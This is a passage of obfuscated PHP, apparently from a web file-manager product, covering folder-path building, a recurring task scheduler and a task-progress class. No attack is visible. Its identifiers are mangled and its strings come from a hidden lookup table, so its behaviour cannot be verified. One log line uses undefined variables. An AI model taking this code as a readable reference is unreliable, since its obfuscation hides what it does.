$¢•ÈÒŸ« = false) { $æº˜ìßŞ =& $_SERVER[¶Ô„œ…¯]; static $Œ®ş¦…ù = array(); $İ‚æ‚¿é = array(); $‡£¨æ¿Ğ = array(); if ($¢•ÈÒŸ«) { return $Œ®ş¦…ù; } foreach ($îªü¤³ö as &$ñ–’‚¦ì) { $¿Ó’Ö› = $ñ–’‚¦ì[$æº˜ìßŞ[193]]; if ($ñ–’‚¦ì[$æº˜ìßŞ[487]] == $æº˜ìßŞ[91] && $ñ–’‚¦ì[$æº˜ìßŞ[192]] != 0) { $Œ®ş¦…ù[$¿Ó’Ö›] = $ñ–’‚¦ì[$æº˜ìßŞ[32]]; } if ($ñ–’‚¦ì[$æº˜ìßŞ[487]] == $æº˜ìßŞ[91] && $ñ–’‚¦ì[$æº˜ìßŞ[192]] == 0) { $Œ®ş¦…ù[$¿Ó’Ö›] = $this->_listAppendPathRoot($ñ–’‚¦ì, array()); } if (isset($‡£¨æ¿Ğ[$ñ–’‚¦ì[$æº˜ìßŞ[586]]])) { continue; } $‡£¨æ¿Ğ[$ñ–’‚¦ì[$æº˜ìßŞ[586]]] = !0; $®Ì¯º×ê = $this->parentLevelArray($ñ–’‚¦ì[$æº˜ìßŞ[586]]); foreach ($®Ì¯º×ê as $š¦¢›ûÕ => $ƒ»êÇ˜ô) { if (isset($Œ®ş¦…ù[$ƒ»êÇ˜ô])) { continue; } if ($š¦¢›ûÕ == 0) { $Œ®ş¦…ù[$ƒ»êÇ˜ô] = $this->_listAppendPathRoot($ñ–’‚¦ì, $®Ì¯º×ê); } if ($š¦¢›ûÕ != 0) { $İ‚æ‚¿é[] = $ƒ»êÇ˜ô; } } } unset($ñ–’‚¦ì); $İ‚æ‚¿é = array_unique($İ‚æ‚¿é); if (count($İ‚æ‚¿é) > 0) { $Å×ŒµË× = array($æº˜ìßŞ[493] => array($æº˜ìßŞ[494], $İ‚æ‚¿é)); if (count($İ‚æ‚¿é) == 1) { $ ìŞüğè = $this->sourceInfo($İ‚æ‚¿é[0]); $¢ßÑìÏÔ = is_array($ ìŞüğè) ? array($ ìŞüğè) : !1; } else { $¢ßÑìÏÔ = $this->field($æº˜ìßŞ[593])->where($Å×ŒµË×)->select(); } if (!$¢ßÑìÏÔ) { $¢ßÑìÏÔ = array(); } foreach ($¢ßÑìÏÔ as $ùºÙ²ù¤) { $Œ®ş¦…ù[$ùºÙ²ù¤[$æº˜ìßŞ[193]]] = $ùºÙ²ù¤[$æº˜ìßŞ[32]]; } } $áåÕ¡ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ö°æƒ“ = array(); foreach ($îªü¤³ö as &$ñ–’‚¦ì) { $¡Ë£‘ƒ = $ñ–’‚¦ì[$æº˜ìßŞ[586]]; $ÆÜÖÌÈá = $æº˜ìßŞ[12]; if (isset($Ö°æƒ“[$¡Ë£‘ƒ])) { $ÆÜÖÌÈá = $Ö°æƒ“[$¡Ë£‘ƒ]; } else { $®Ì¯º×ê = $this->parentLevelArray($ñ–’‚¦ì[$æº˜ìßŞ[586]]); foreach ($®Ì¯º×ê as $š¦¢›ûÕ => $ƒ»êÇ˜ô) { if (isset($Œ®ş¦…ù[$ƒ»êÇ˜ô])) { $ÆÜÖÌÈá .= $Œ®ş¦…ù[$ƒ»êÇ˜ô] . $æº˜ìßŞ[8]; } } $Ö°æƒ“[$¡Ë£‘ƒ] = $ÆÜÖÌÈá; } $ÆÜÖÌÈá .= $ñ–’‚¦ì[$æº˜ìßŞ[32]]; if ($ñ–’‚¦ì[$æº˜ìßŞ[487]] == $æº˜ìßŞ[91]) { $ÆÜÖÌÈá .= $æº˜ìßŞ[8]; } $ñ–’‚¦ì[$æº˜ìßŞ[584]] = str_replace($æº˜ìßŞ[256], $æº˜ìßŞ[8], $ÆÜÖÌÈá); if ($ñ–’‚¦ì[$æº˜ìßŞ[192]] == $æº˜ìßŞ[230]) { $ñ–’‚¦ì[$æº˜ìßŞ[32]] = trim($Œ®ş¦…ù[$ñ–’‚¦ì[$æº˜ìßŞ[193]]], $æº˜ìßŞ[8]); $ñ–’‚¦ì[$æº˜ìßŞ[584]] = $ñ–’‚¦ì[$æº˜ìßŞ[32]] . $æº˜ìßŞ[8]; } if (intval($ñ–’‚¦ì[$æº˜ìßŞ[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ñ–’‚¦ì, $®Ì¯º×ê, $áåÕ¡); } } unset($ñ–’‚¦ì); return $îªü¤³ö; } private function _listAppendPathRecycle(&$“´˜š“Ò, $×‹øàşÆ, $ì›Í ƒÀ) { $Æ°¡£’ö =& $_SERVER[¶Ô„œ…¯]; if (!in_array($ì›Í ƒÀ, $×‹øàşÆ) && $“´˜š“Ò[$Æ°¡£’ö[193]] != $ì›Í ƒÀ) { return; } $üÎ‘çğŒ = explode($Æ°¡£’ö[8], trim($“´˜š“Ò[$Æ°¡£’ö[584]], $Æ°¡£’ö[8])); $ìÆ´Æ¹” = implode($Æ°¡£’ö[8], array_slice($üÎ‘çğŒ, 2)); $“´˜š“Ò[$Æ°¡£’ö[584]] = $Æ°¡£’ö[8] . LNG($Æ°¡£’ö[594]) . $Æ°¡£’ö[8] . ltrim($ìÆ´Æ¹”, $Æ°¡£’ö[8]); $“´˜š“Ò[$Æ°¡£’ö[586]] = $Æ°¡£’ö[595] . implode($Æ°¡£’ö[50], array_slice($×‹øàşÆ, 1)) . $Æ°¡£’ö[50]; if ($“´˜š“Ò[$Æ°¡£’ö[193]] == $ì›Í ƒÀ) { $“´˜š“Ò[$Æ°¡£’ö[586]] = $Æ°¡£’ö[595]; $“´˜š“Ò[$Æ°¡£’ö[192]] = $Æ°¡£’ö[230]; $“´˜š“Ò[$Æ°¡£’ö[32]] = LNG($Æ°¡£’ö[594]); } $“´˜š“Ò[$Æ°¡£’ö[596]] = $Æ°¡£’ö[597]; } protected function _listAppendPathRoot(&$“©­Ú§§, $àöó¨µ) { $ÙåÖ“ =& $_SERVER[¶Ô„œ…¯]; static $…‚óºŸ = false; static $‡§öÎÌ« = false; $¨ÈŒÈŠÅ = $ÙåÖ“[12]; if ($“©­Ú§§[$ÙåÖ“[190]] == self::TYPE_USER) { if ($“©­Ú§§[$ÙåÖ“[571]] == USER_ID) { $¨ÈŒÈŠÅ = LNG($ÙåÖ“[598]); if ($…‚óºŸ === !1) { $®ååŞ©Ô = Model($ÙåÖ“[599])->getInfoFull(USER_ID); $…‚óºŸ = _get($®ååŞ©Ô, $ÙåÖ“[600], $ÙåÖ“[12]); } if ($‡§öÎÌ« === !1) { $®ååŞ©Ô = Model($ÙåÖ“[599])->getInfoFull(USER_ID); $‡§öÎÌ« = _get($®ååŞ©Ô, $ÙåÖ“[601], $ÙåÖ“[12]); } if ($àöó¨µ && $àöó¨µ[0] == $…‚óºŸ || !$àöó¨µ && $“©­Ú§§[$ÙåÖ“[193]] == $…‚óºŸ) { $¨ÈŒÈŠÅ = LNG($ÙåÖ“[602]); $“©­Ú§§[$ÙåÖ“[603]] = $ÙåÖ“[604]; } if ($àöó¨µ && $àöó¨µ[0] == $‡§öÎÌ« || !$àöó¨µ && $“©­Ú§§[$ÙåÖ“[193]] == $‡§öÎÌ«) { $¨ÈŒÈŠÅ = $¨ÈŒÈŠÅ . $ÙåÖ“[605] . LNG($ÙåÖ“[606]); } if (!$àöó¨µ) { $“©­Ú§§[$ÙåÖ“[32]] = $¨ÈŒÈŠÅ; } } else { $®ååŞ©Ô = Model($ÙåÖ“[599])->getInfoFull($“©­Ú§§[$ÙåÖ“[571]]); $ºÄÚÕˆ = _get($®ååŞ©Ô, $ÙåÖ“[601], $ÙåÖ“[12]); $“©­Ú§§[$ÙåÖ“[607]] = Model($ÙåÖ“[579])->getInfoSimpleOuter($“©­Ú§§[$ÙåÖ“[571]]); $¨ÈŒÈŠÅ = LNG($ÙåÖ“[608]) . $ÙåÖ“[176] . $“©­Ú§§[$ÙåÖ“[607]][$ÙåÖ“[32]] . $ÙåÖ“[178]; if ($àöó¨µ && $àöó¨µ[0] == $ºÄÚÕˆ || !$àöó¨µ && $“©­Ú§§[$ÙåÖ“[193]] == $ºÄÚÕˆ) { $¨ÈŒÈŠÅ = LNG($ÙåÖ“[608]) . $ÙåÖ“[609] . $“©­Ú§§[$ÙåÖ“[607]][$ÙåÖ“[32]] . $ÙåÖ“[605] . LNG($ÙåÖ“[606]) . $ÙåÖ“[178]; } } } else { if ($“©­Ú§§[$ÙåÖ“[190]] == self::TYPE_GROUP) { $ı·¥ÆŒ = Model($ÙåÖ“[587])->getInfoSimple($“©­Ú§§[$ÙåÖ“[571]]); $¨ÈŒÈŠÅ = $ı·¥ÆŒ[$ÙåÖ“[32]]; } else { if ($“©­Ú§§[$ÙåÖ“[190]] == self::TYPE_SYSTEM) { $¨ÈŒÈŠÅ = $ÙåÖ“[610]; } } } $¨ÈŒÈŠÅ = $¨ÈŒÈŠÅ ? $ÙåÖ“[8] . $¨ÈŒÈŠÅ . $ÙåÖ“[8] : $ÙåÖ“[8]; return $¨ÈŒÈŠÅ; } protected function _listAppendUser(&$ïÉŒÏ°“) { $á×Âûùº =& $_SERVER[¶Ô„œ…¯]; $¦¹Æî»† = array_to_keyvalue($ïÉŒÏ°“, $á×Âûùº[12], $á×Âûùº[529]); $°¿òÌïì = array_to_keyvalue($ïÉŒÏ°“, $á×Âûùº[12], $á×Âûùº[531]); $¾ˆøÜÇ = array_merge($¦¹Æî»†, $°¿òÌïì); $Šş™›±™ = Model($á×Âûùº[599])->userListInfo($¾ˆøÜÇ); foreach ($ïÉŒÏ°“ as &$§ô‚¢Ô) { $ÑşÍé¬ğ = $§ô‚¢Ô[$á×Âûùº[529]]; $§ô‚¢Ô[$á×Âûùº[529]] = $Šş™›±™[$ÑşÍé¬ğ] ? $Šş™›±™[$ÑşÍé¬ğ] : !1; $ÑşÍé¬ğ = $§ô‚¢Ô[$á×Âûùº[531]]; $§ô‚¢Ô[$á×Âûùº[531]] = $Šş™›±™[$ÑşÍé¬ğ] ? $Šş™›±™[$ÑşÍé¬ğ] : !1; if (_get($§ô‚¢Ô, $á×Âûùº[611], 0)) { $úƒĞˆô = $GLOBALS[$á×Âûùº[6]][$á×Âûùº[92]][$á×Âûùº[612]]; if ($§ô‚¢Ô[$á×Âûùº[541]][$á×Âûùº[613]] <= time() - $úƒĞˆô) { $this->metaSet($§ô‚¢Ô[$á×Âûùº[193]], $á×Âûùº[614], null); $this->metaSet($§ô‚¢Ô[$á×Âûùº[193]], $á×Âûùº[613], null); unset($§ô‚¢Ô[$á×Âûùº[541]][$á×Âûùº[614]]); continue; } $éÈ®€Ø¶ = $§ô‚¢Ô[$á×Âûùº[541]][$á×Âûùº[614]]; $§ô‚¢Ô[$á×Âûùº[541]][$á×Âûùº[615]] = Model($á×Âûùº[599])->getInfoSimpleOuter($éÈ®€Ø¶); } } unset($§ô‚¢Ô); } public function parentLevelArray($ğøœç ) { $ˆôÄªÈ‚ =& $_SERVER[¶Ô„œ…¯]; $ğøœç  = explode($ˆôÄªÈ‚[50], trim($ğøœç , $ˆôÄªÈ‚[50])); return array_remove_value($ğøœç , $ˆôÄªÈ‚[230]); } public function listAll($š¥™³ƒˆ) { $ª½¿Ê€™ =& $_SERVER[¶Ô„œ…¯]; $×œ’ƒ­ = $this->sourceInfo($š¥™³ƒˆ); $±÷È¼·Ğ = array($ª½¿Ê€™[616] => array($ª½¿Ê€™[617], $×œ’ƒ­[$ª½¿Ê€™[586]] . $š¥™³ƒˆ . $ª½¿Ê€™[618]), $ª½¿Ê€™[619] => 0); $’‡şÏ¾† = $ª½¿Ê€™[620]; $ÔµÑ›™ = "\x4c\x45\106\124\x20\x4a\117\111\x4e\40{$this->tablePrefix}\151\x6f\137\146\x69\x6c\145\40\146\x69\154\x65\x20\x6f\156\40\x73\x6f\165\162\x63\145\x2e\146\x69\x6c\x65\x49\104\x20\x3d\40\x66\151\x6c\x65\x2e\146\x69\x6c\145\x49\104"; $ß‘ßç† = $this->alias($ª½¿Ê€™[521])->field($’‡şÏ¾†)->where($±÷È¼·Ğ)->join($ÔµÑ›™)->select(); $this->_listAppendAuth($ß‘ßç†); $this->_listAppendUser($ß‘ßç†); $this->_listAppendPath($ß‘ßç†); $ß‘ßç† = array_to_keyvalue($ß‘ßç†, $ª½¿Ê€™[193]); $É¯çğù… = "\57{$×œ’ƒ­[$ª½¿Ê€™[32]]}\57"; $É¯çğù… = $É¯çğù… == $ª½¿Ê€™[256] ? $ª½¿Ê€™[8] : $É¯çğù…; $Şß‰«İà = array(); foreach ($ß‘ßç† as $ØªÏ³Ø¯ => $ÙÑ£©¿ù) { $³ŞÇË°Ì = $this->parentLevelArray($ÙÑ£©¿ù[$ª½¿Ê€™[586]]); array_shift($³ŞÇË°Ì); $ªğËêá = $É¯çğù…; for ($óÈ‡¶ˆç = 0; $óÈ‡¶ˆç < count($³ŞÇË°Ì); $óÈ‡¶ˆç++) { $ªğËêá .= $ß‘ßç†[$³ŞÇË°Ì[$óÈ‡¶ˆç]][$ª½¿Ê€™[32]] . $ª½¿Ê€™[8]; } $ªğËêá .= $ÙÑ£©¿ù[$ª½¿Ê€™[32]]; if ($ÙÑ£©¿ù[$ª½¿Ê€™[487]]) { $ªğËêá .= $ª½¿Ê€™[8]; } $³ÛÏŒ‹¨ = array($ª½¿Ê€™[497] => str_replace($ª½¿Ê€™[256], $ª½¿Ê€™[8], str_replace($ª½¿Ê€™[256], $ª½¿Ê€™[8], str_replace($ª½¿Ê€™[256], $ª½¿Ê€™[8], $ªğËêá))), $ª½¿Ê€™[621] => intval($ÙÑ£©¿ù[$ª½¿Ê€™[487]]), $ª½¿Ê€™[622] => intval($ÙÑ£©¿ù[$ª½¿Ê€™[79]]), $ª½¿Ê€™[88] => intval($ÙÑ£©¿ù[$ª½¿Ê€™[88]]), $ª½¿Ê€™[90] => $this->pathInfoFilter($ÙÑ£©¿ù)); if (!$³ÛÏŒ‹¨[$ª½¿Ê€™[487]]) { $³ÛÏŒ‹¨[$ª½¿Ê€™[543]] = $ÙÑ£©¿ù[$ª½¿Ê€™[543]]; } $Şß‰«İà[] = $³ÛÏŒ‹¨; } $Şß‰«İà = array_sort_by($Şß‰«İà, $ª½¿Ê€™[87]); return $Şß‰«İà; } } goto aƒ©‰ÄãÍ ; C‹„·ìµé‹: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ìô¯›ã =& $_SERVER[¶Ô„œ…¯]; if (self::valueGet($ìô¯›ã[828]) != $ìô¯›ã[91]) { return; } if (self::valueGet($ìô¯›ã[1729]) == $ìô¯›ã[91]) { $‚ËìÎ‹ = self::valueGet($ìô¯›ã[1730]); if (time() - $‚ËìÎ‹ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ìô¯›ã[1729], $ìô¯›ã[91]); self::log($ìô¯›ã[1731] . ACTION . $ìô¯›ã[1732]); Hook::bind($ìô¯›ã[1733], $ìô¯›ã[1734]); $³‹ú¸àÇ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ìô¯›ã[828]) != $ìô¯›ã[91]) { self::valueSet($ìô¯›ã[1729], $ìô¯›ã[230]); self::log($ìô¯›ã[1735]); die; } $¹‡üƒƒå = time(); if ($¹‡üƒƒå - $³‹ú¸àÇ >= 60) { self::valueSet(array($ìô¯›ã[1729] => $ìô¯›ã[91], $ìô¯›ã[1730] => $¹‡üƒƒå)); $³‹ú¸àÇ = $¹‡üƒƒå; } if (!file_exists(USER_SYSTEM . $ìô¯›ã[1736])) { self::valueSet(array($ìô¯›ã[1729] => $ìô¯›ã[230], $ìô¯›ã[828] => $ìô¯›ã[230])); self::log($ìô¯›ã[1737]); die; } $æóÙÏùÁ = file_get_contents(BASIC_PATH . $ìô¯›ã[1738]); $’Ë±Âµš = KOD_VERSION . $ìô¯›ã[10] . KOD_VERSION_BUILD; $·ÜÕÀ›Û = match_text($æóÙÏùÁ, $ìô¯›ã[1739]) . $ìô¯›ã[10] . match_text($æóÙÏùÁ, $ìô¯›ã[1740]); if ($·ÜÕÀ›Û != $’Ë±Âµš) { self::restart(); self::log("\163\164\157\x70\145\x64\56\x5b\x76\x65\162\163\151\x6f\156\40\x75\160\x64\141\164\x65\x3b{$versionNow}\40\75\x3e\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $Ÿà‰»êı =& $_SERVER[¶Ô„œ…¯]; http_close(); $GLOBALS[$Ÿà‰»êı[1741]] = 1; $_SERVER[$Ÿà‰»êı[1742]] = $Ÿà‰»êı[1743]; $_COOKIE = array(); $GLOBALS[$Ÿà‰»êı[1744]] = 1; $GLOBALS[$Ÿà‰»êı[1745]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ˆµíÜıİ =& $_SERVER[¶Ô„œ…¯]; http_close(); self::valueSet($ˆµíÜıİ[828], $ˆµíÜıİ[230]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ˆµíÜıİ[1729] => $ˆµíÜıİ[230], $ˆµíÜıİ[828] => $ˆµíÜıİ[91])); self::log($ˆµíÜıİ[1746]); } public static function taskSwitch() { $ó­ëÏÓ =& $_SERVER[¶Ô„œ…¯]; $ºê§ = self::valueGet($ó­ëÏÓ[828]) == $ó­ëÏÓ[91] ? $ó­ëÏÓ[230] : $ó­ëÏÓ[91]; self::valueSet($ó­ëÏÓ[828], $ºê§); } public static function shutdownEvent() { $±¿çŠ’ =& $_SERVER[¶Ô„œ…¯]; self::valueSet($±¿çŠ’[1729], $±¿çŠ’[230]); self::log($±¿çŠ’[1747]); } public static function config($¨‡Û×àÀ, $íàá¹Î) { self::valueSet($_SERVER[¶Ô„œ…¯][828], $¨‡Û×àÀ); } private static function taskRunAll() { $¨Ñéı–– =& $_SERVER[¶Ô„œ…¯]; $ıÑÛ‚óõ = timeFloat(); $Ç¾ãëÎ = Model($¨Ñéı––[1748])->listData(); $ÕÓ°ä³È = count($Ç¾ãëÎ); for ($öÔ•¡ñ = 0; $öÔ•¡ñ < $ÕÓ°ä³È; $öÔ•¡ñ++) { $’¬áÔİÇ = $Ç¾ãëÎ[$öÔ•¡ñ]; if (!$’¬áÔİÇ[$¨Ñéı––[477]] || $’¬áÔİÇ[$¨Ñéı––[1749]] != $¨Ñéı––[91]) { continue; } if (!self::taskTimeCheck($’¬áÔİÇ)) { continue; } self::taskRun($’¬áÔİÇ); } Hook::trigger($¨Ñéı––[1750]); self::taskQueueRun($ıÑÛ‚óõ); } private static function taskQueueRun($í³ÎÆ²) { $ìœÁÓÌî = 10; while (!0) { $¸Áœı÷ = TaskQueue::run(); if ($¸Áœı÷ === !1) { break; } if (timeFloat() - $í³ÎÆ² >= $ìœÁÓÌî) { break; } } } private static function taskTimeCheck($Î€ÈÏó‹) { $–åÕ”ê° =& $_SERVER[¶Ô„œ…¯]; $àõèàË¤ = json_decode($Î€ÈÏó‹[$–åÕ”ê°[206]], !0); $ß§—û±³ = intval($Î€ÈÏó‹[$–åÕ”ê°[1730]]); $ŠÄ¢ÌĞ› = strtotime($–åÕ”ê°[1751] . $àõèàË¤[$–åÕ”ê°[1752]] . $–åÕ”ê°[1753]) - strtotime($–åÕ”ê°[1754]); $±›Ì¦ƒ§ = time() - strtotime(date($–åÕ”ê°[1755]) . $–åÕ”ê°[1756]); $©èşÓÊÉ = $±›Ì¦ƒ§ >= $ŠÄ¢ÌĞ› && $±›Ì¦ƒ§ <= $ŠÄ¢ÌĞ› + 3600; switch ($àõèàË¤[$–åÕ”ê°[33]]) { case $–åÕ”ê°[1757]: if (time() - $ß§—û±³ < 3600 * 24 * 30) { return !1; } if ($àõèàË¤[$–åÕ”ê°[1757]] == date($–åÕ”ê°[1758]) && $©èşÓÊÉ) { return !0; } break; case $–åÕ”ê°[1759]: if (time() - $ß§—û±³ < 3600 * 24 * 7) { return !1; } $Å°ãÆè = date($–åÕ”ê°[1760]) == 0 ? 7 : date($–åÕ”ê°[1760]); if ($àõèàË¤[$–åÕ”ê°[1759]] == $Å°ãÆè && $©èşÓÊÉ) { return !0; } break; case $–åÕ”ê°[1752]: if (time() - $ß§—û±³ < 3600 * 24) { return !1; } if ($©èşÓÊÉ) { return !0; } break; case $–åÕ”ê°[1761]: if (time() - $ß§—û±³ >= floatval($àõèàË¤[$–åÕ”ê°[1761]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $íÉ÷ŞÌ¬ =& $_SERVER[¶Ô„œ…¯]; static $Øæäá Ñ = 0; $ÎÛœÀéÆ = 300; if (!$Øæäá Ñ) { $Øæäá Ñ = time(); } if (time() - $Øæäá Ñ < $ÎÛœÀéÆ) { return; } $Øæäá Ñ = time(); $Ãï¬ªÎñ = Model($íÉ÷ŞÌ¬[579])->db($íÉ÷ŞÌ¬[12]); if ($Ãï¬ªÎñ) { $Ãï¬ªÎñ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($íÉ÷ŞÌ¬[1762], $íÉ÷ŞÌ¬[1763]); die; } } public static function taskRun($è¥§íÎ‚) { $ºË»¸ =& $_SERVER[¶Ô„œ…¯]; self::log($ºË»¸[1764] . $è¥§íÎ‚[$ºË»¸[477]] . $ºË»¸[1765] . $è¥§íÎ‚[$ºË»¸[32]] . $ºË»¸[1766] . $è¥§íÎ‚[$ºË»¸[1767]]); Model($ºË»¸[1748])->run($è¥§íÎ‚[$ºË»¸[477]]); $ŸëíòöÛ = timeFloat(); $âİş°ä¶ = $ºË»¸[12]; switch ($è¥§íÎ‚[$ºË»¸[33]]) { case $ºË»¸[384]: $ä¬ŸËğñ = url_request($è¥§íÎ‚[$ºË»¸[1767]], $ºË»¸[1504], !1, !1, !1, !1, 10); if ($ä¬ŸËğñ[$ºË»¸[828]]) { $âİş°ä¶ = strlen($ä¬ŸËğñ[$ºË»¸[1294]]); } break; case $ºË»¸[1768]: $âİş°ä¶ = Hook::apply($è¥§íÎ‚[$ºË»¸[1767]]); default: break; } Model($ºË»¸[1769])->add(array($ºË»¸[1770] => $ºË»¸[12], $ºË»¸[1771] => $ºË»¸[230], $ºË»¸[33] => $ºË»¸[1772] . $è¥§íÎ‚[$ºË»¸[477]], $ºË»¸[1773] => json_encode(array($ºË»¸[32] => $è¥§íÎ‚[$ºË»¸[32]], $ºË»¸[1774] => timeFloat() - $ŸëíòöÛ, $ºË»¸[370] => $âİş°ä¶)))); $àÏÓ§®“ = $âİş°ä¶ ? $ºË»¸[1775] . $âİş°ä¶ : $ºË»¸[12]; self::log($ºË»¸[1776] . $è¥§íÎ‚[$ºË»¸[477]] . $ºË»¸[178] . $àÏÓ§®“); return !0; } public static function valueGet($€™õÂÆ) { $¶â°©ÊÈ =& $_SERVER[¶Ô„œ…¯]; $×â·®…„ = $¶â°©ÊÈ[1777]; $ÚÖ•Ì¹ü = Model($¶â°©ÊÈ[510])->get($€™õÂÆ, $×â·®…„); if (is_null($ÚÖ•Ì¹ü)) { Model($¶â°©ÊÈ[510])->set($¶â°©ÊÈ[828], $¶â°©ÊÈ[91], $×â·®…„); Model($¶â°©ÊÈ[510])->set($¶â°©ÊÈ[1729], $¶â°©ÊÈ[230], $×â·®…„); $ÚÖ•Ì¹ü = Model($¶â°©ÊÈ[510])->get($€™õÂÆ, $×â·®…„); } return $ÚÖ•Ì¹ü; } private static function valueSet($‚¦ñÚã„, $•«åûîê = false) { $ËáÑÊîî =& $_SERVER[¶Ô„œ…¯]; $éÆ™Ôñ = $ËáÑÊîî[1778]; CacheLock::lock($éÆ™Ôñ); $òĞˆÍßñ = Model($ËáÑÊîî[510])->set($‚¦ñÚã„, $•«åûîê, $ËáÑÊîî[1777]); CacheLock::unlock($éÆ™Ôñ); return $òĞˆÍßñ; } protected static function log($âËô´ÜÀ) { write_log($âËô´ÜÀ, $_SERVER[¶Ô„œ…¯][1763]); } private static function cacheClear() { $´‹å¼”ú =& $_SERVER[¶Ô„œ…¯]; Cache::clearMemory(Model($´‹å¼”ú[510])->cacheKey($´‹å¼”ú[1777])); Cache::clearMemory(Model($´‹å¼”ú[510])->cacheKey($´‹å¼”ú[1779])); Model($´‹å¼”ú[1748])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\x72\165\156\x6e\151\x6e\x67"; const STATYS_KILL = "\x6b\151\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ÇÏÍ¦©Š, $ğÃ¾èÏ = '', $€Ï¬øÏø = 0, $Íïö®¹ü = '') { $¯ää¥Ñ¡ =& $_SERVER[¶Ô„œ…¯]; if (self::get($ÇÏÍ¦©Š)) { return; } $this->task = array($¯ää¥Ñ¡[477] => $ÇÏÍ¦©Š, $¯ää¥Ñ¡[1780] => USER_ID, $¯ää¥Ñ¡[1666] => $Íïö®¹ü, $¯ää¥Ñ¡[528] => $¯ää¥Ñ¡[12], $¯ää¥Ñ¡[33] => $ğÃ¾èÏ, $¯ää¥Ñ¡[1149] => $¯ää¥Ñ¡[12], $¯ää¥Ñ¡[1147] => $€Ï¬øÏø, $¯ää¥Ñ¡[1781] => 0, $¯ää¥Ñ¡[1782] => 0, $¯ää¥Ñ¡[1783] => 0, $¯ää¥Ñ¡[1784] => timeFloat(), $¯ää¥Ñ¡[1785] => 0, $¯ää¥Ñ¡[1786] => 0, $¯ää¥Ñ¡[1787] => 0, $¯ää¥Ñ¡[1788] => 0, $¯ää¥Ñ¡[828] => $¯ää¥Ñ¡[1729]); $GLOBALS[$¯ää¥Ñ¡[1789]] = 1; Hook::bind($¯ää¥Ñ¡[1733], array($this, $¯ää¥Ñ¡[1790])); Hook::bind($¯ää¥Ñ¡[1791], array($this, $¯ää¥Ñ¡[1792])); $this->startAfter(); Hook::trigger($¯ää¥Ñ¡[1793], $this->task); $this->task[$¯ää¥Ñ¡[1786]] = timeFloat(); } public function end($‘Œ‹«óŒ = '') { $ø³ Î·ã =& $_SERVER[¶Ô„œ…¯]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ø³ Î·ã[1786]]) { self::valueSet($this->task[$ø³ Î·ã[477]], !1); } $this->isEnd = !0; if ($‘Œ‹«óŒ) { $this->task[$ø³ Î·ã[528]] = $‘Œ‹«óŒ; } self::log($ø³ Î·ã[1794] . $this->task[$ø³ Î·ã[477]] . $ø³ Î·ã[1795] . sprintf($ø³ Î·ã[938], timeFloat() - $this->task[$ø³ Î·ã[1784]]) . $ø³ Î·ã[1796]); Hook::unbind($ø³ Î·ã[1733], array($this, $ø³ Î·ã[1790])); Hook::unbind($ø³ Î·ã[1791], array($this, $ø³ Î·ã[1792])); $this->endAfter(); $”êê¿¿À = $this->task; $this->task = !1; Hook::trigger($ø³ Î·ã[1797], $”êê¿¿À); } public function update($Æ†±Æ³è = 0, $Œ‡ÛÓÒº = false) { $àöœè„  =& $_SERVER[¶Ô„œ…¯]; $‡•ÆØ“ =& $this->task; if (!$‡•ÆØ“) { return; } $‡•ÆØ“[$àöœè„ [1781]] += $Æ†±Æ³è; $‡•ÆØ“[$àöœè„ [1785]] = timeFloat(); if ($‡•ÆØ“[$àöœè„ [1147]]) { if ($‡•ÆØ“[$àöœè„ [1147]] < $‡•ÆØ“[$àöœè„ [1781]]) { $‡•ÆØ“[$àöœè„ [1147]] = $‡•ÆØ“[$àöœè„ [1781]]; } $Šïòô†¨ = timeFloat() - $‡•ÆØ“[$àöœè„ [1784]] - $‡•ÆØ“[$àöœè„ [1787]]; if ($Šïòô†¨ <= 0) { $Šïòô†¨ = 0.001; } $‡•ÆØ“[$àöœè„ [1782]] = $‡•ÆØ“[$àöœè„ [1781]] / $‡•ÆØ“[$àöœè„ [1147]]; $‡•ÆØ“[$àöœè„ [1783]] = $‡•ÆØ“[$àöœè„ [1781]] / $Šïòô†¨; if ($‡•ÆØ“[$àöœè„ [1782]] > 0) { $‡•ÆØ“[$àöœè„ [1788]] = $Šïòô†¨ * (1 - $‡•ÆØ“[$àöœè„ [1782]]) / $‡•ÆØ“[$àöœè„ [1782]]; } $‡•ÆØ“[$àöœè„ [1788]] = $‡•ÆØ“[$àöœè„ [1788]] <= 0 ? 0 : $‡•ÆØ“[$àöœè„ [1788]]; } $this->updateAfter(); $Úô‡“°¤ = 0.2; if (timeFloat() - $‡•ÆØ“[$àöœè„ [1786]] < $Úô‡“°¤ && !$Œ‡ÛÓÒº) { return; } $Ì‡²øÇÍ = self::get($‡•ÆØ“[$àöœè„ [477]]); $ËˆËÇÍ‰ = $Ì‡²øÇÍ[$àöœè„ [828]]; if ($ËˆËÇÍ‰ == self::STATYS_KILL) { $ˆ½Ãµì° = array($àöœè„ [1798] => LNG($àöœè„ [1799]), $àöœè„ [1304] => !1); Cache::set($àöœè„ [1800] . $this->task[$àöœè„ [477]], $ˆ½Ãµì°, 30); $this->onKill(); $this->end(); die; } else { if ($ËˆËÇÍ‰ == self::STATYS_STOP) { $–æ™•½ë = 2; $Ì‡²øÇÍ[$àöœè„ [1787]] += $–æ™•½ë; self::valueSet($‡•ÆØ“[$àöœè„ [477]], $Ì‡²øÇÍ); sleep($–æ™•½ë); $this->update(); return; } } $‡•ÆØ“[$àöœè„ [828]] = $ËˆËÇÍ‰ ? $ËˆËÇÍ‰ : $‡•ÆØ“[$àöœè„ [828]]; $‡•ÆØ“[$àöœè„ [1787]] = $Ì‡²øÇÍ[$àöœè„ [1787]] ? $Ì‡²øÇÍ[$àöœè„ [1787]] : 0; $‡•ÆØ“[$àöœè„ [1786]] = timeFloat(); Hook::trigger($àöœè„ [1801], $‡•ÆØ“); self::valueSet($‡•ÆØ“[$àöœè„ [477]], $‡•ÆØ“); } public function 